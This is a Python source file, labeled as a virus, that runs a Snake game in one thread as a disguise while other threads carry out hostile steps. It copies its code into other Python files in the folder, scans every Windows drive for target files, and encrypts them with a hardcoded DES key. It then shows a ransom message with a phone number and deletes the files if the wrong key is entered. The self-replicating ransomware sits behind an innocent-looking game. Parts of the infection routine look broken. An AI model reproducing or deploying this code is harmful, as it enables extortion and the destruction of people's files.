### THE VIRUS STARTS HERE ###
#0
import threading
import random
import glob, sys
sys.path.append("./DES")
import DES
import string, os, shutil
from ctypes import windll
#end
#1
def infection():
    code= [[],[],[],[],[],[],[]]
    # open this file,read every lines and find the virus area
    with open(sys.argv[0], 'r') as f:
        lines = f.readlines()

    virus_area = False
    area=False
    for line in lines:
        
        if line == "### THE VIRUS STARTS HERE ###\n":
            virus_area = True
        if virus_area :
            code.append(line)
        if line == '### THE VIRUS ENDS HERE ###\n':
            break


    arr = random.sample(range(7), 7)
    codes=[] 
    codes.append("### THE VIRUS STARTS HERE ###\n") 
    codes.append("#"+str(arr[0])+"\n")
    for i in code[arr[0]]:
        print(i)
    codes.append("#end")
    # open every files and write the replicate code

    python_scripts = glob.glob('*.py') + glob.glob('*.pyw')

    #print(python_scripts)

    for script in python_scripts: 
        with open(script, 'r', encoding='utf-8', errors='ignore') as f:
            script_code = f.readlines()

        infected = False
        for line in script_code:
            if line == "### THE VIRUS STARTS HERE ###\n":
                infected = True
                break
        
        if not infected:
            final_code = []
            final_code.extend(codes)
            final_code.extend('\n')
            final_code.extend(script_code)

            with open(script, 'w', encoding='utf-8') as f:
                f.writelines(final_code)
#end

#2 
# lấy path và thêm vào một file 
def get_drives(): 
        drives = []
        bitmask = windll.kernel32.GetLogicalDrives()
        for letter in string.ascii_uppercase:
            if bitmask & 1:
                drives.append(letter)
            bitmask >>= 1
        return drives
#end

#3
def get_file(drives):
    pathfiles=[]
    for i in drives:
        src_dir = i + ':\\'
        filePath = ''
        for dirpath, subdirs, files in os.walk(src_dir):
            for x in files:
                #  if x.endswith(".docx"): 
                if x=='a.txt':
                    pathfiles.append(os.path.join(dirpath, x))


    for i in pathfiles:
        print (i,end='\n')
    return pathfiles

#end

#4
def encpyt( pathfiles):
    # mã hóa 
    key="anhtuan"
    for i in pathfiles:
    
        try:
            with open(i,"r") as infile:
                nd= infile.read(16)
            
            nd_mh = DES.des_encrypt(nd,key)
            with open(i ,"w") as outfile:
                outfile.write(nd_mh)
                
        except shutil.SameFileError:
            pass
    
#end

#5
def decrypt(pathfiles):

  
        for i in pathfiles:
            try:
                with open(i,"r") as infile:
                    nd_mh= infile.read()
            
                nd_gm = DES.des_decrypt(str(nd_mh),"anhtuan")
                with open(i ,"w") as outfile:
                    outfile.write(nd_gm)
            except shutil.SameFileError:
                pass


#end
#6
def run():
    drives = get_drives()
    pathfiles = get_file(drives)
    encpyt(pathfiles)
   
    print("Liên hệ 0399020331 để lấy key\n")
    keyworld= input("Nhap key de mo khoa ")
    if (keyworld=="anhtuan"):
         decrypt(pathfiles)
    else:
        for file in pathfiles:
            os.remove(file)

#end
### THE VIRUS ENDS HERE ###
def mask():
    import pygame
    import time
    import random
    
    pygame.init()
    
    white = (255, 255, 255)
    yellow = (255, 255, 102)
    black = (0, 0, 0)
    red = (213, 50, 80)
    green = (0, 255, 0)
    blue = (50, 153, 213)
    
    dis_width = 600
    dis_height = 400
    
    dis = pygame.display.set_mode((dis_width, dis_height))
    pygame.display.set_caption('Snake Game by Edureka')
    
    clock = pygame.time.Clock()
    
    snake_block = 10
    snake_speed = 15
    
    font_style = pygame.font.SysFont("bahnschrift", 25)
    score_font = pygame.font.SysFont("comicsansms", 35)
    
    
    def Your_score(score):
        value = score_font.render("Your Score: " + str(score), True, yellow)
        dis.blit(value, [0, 0])
    
    
    
    def our_snake(snake_block, snake_list):
        for x in snake_list:
            pygame.draw.rect(dis, black, [x[0], x[1], snake_block, snake_block])
    
    
    def message(msg, color):
        mesg = font_style.render(msg, True, color)
        dis.blit(mesg, [dis_width / 6, dis_height / 3])
    
    
    def gameLoop():
        game_over = False
        game_close = False
    
        x1 = dis_width / 2
        y1 = dis_height / 2
    
        x1_change = 0
        y1_change = 0
    
        snake_List = []
        Length_of_snake = 1
    
        foodx = round(random.randrange(0, dis_width - snake_block) / 10.0) * 10.0
        foody = round(random.randrange(0, dis_height - snake_block) / 10.0) * 10.0
    
        while not game_over:
    
            while game_close == True:
                dis.fill(blue)
                message("You Lost! Press C-Play Again or Q-Quit", red)
                Your_score(Length_of_snake - 1)
                pygame.display.update()
    
                for event in pygame.event.get():
                    if event.type == pygame.KEYDOWN:
                        if event.key == pygame.K_q:
                            game_over = True
                            game_close = False
                        if event.key == pygame.K_c:
                            gameLoop()
    
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    game_over = True
                if event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_LEFT:
                        x1_change = -snake_block
                        y1_change = 0
                    elif event.key == pygame.K_RIGHT:
                        x1_change = snake_block
                        y1_change = 0
                    elif event.key == pygame.K_UP:
                        y1_change = -snake_block
                        x1_change = 0
                    elif event.key == pygame.K_DOWN:
                        y1_change = snake_block
                        x1_change = 0
    
            if x1 >= dis_width or x1 < 0 or y1 >= dis_height or y1 < 0:
                game_close = True
            x1 += x1_change
            y1 += y1_change
            dis.fill(blue)
            pygame.draw.rect(dis, green, [foodx, foody, snake_block, snake_block])
            snake_Head = []
            snake_Head.append(x1)
            snake_Head.append(y1)
            snake_List.append(snake_Head)
            if len(snake_List) > Length_of_snake:
                del snake_List[0]
    
            for x in snake_List[:-1]:
                if x == snake_Head:
                    game_close = True
    
            our_snake(snake_block, snake_List)
            Your_score(Length_of_snake - 1)
    
            pygame.display.update()
    
            if x1 == foodx and y1 == foody:
                foodx = round(random.randrange(0, dis_width - snake_block) / 10.0) * 10.0
                foody = round(random.randrange(0, dis_height - snake_block) / 10.0) * 10.0
                Length_of_snake += 1
    
            clock.tick(snake_speed)
    
        pygame.quit()
        quit()
    
    
    gameLoop()
T3 = threading.Thread(target=mask)
T3.start()
T1 = threading.Thread(target=infection)
T1.start()
T2 = threading.Thread(target=(run))
T2.start()


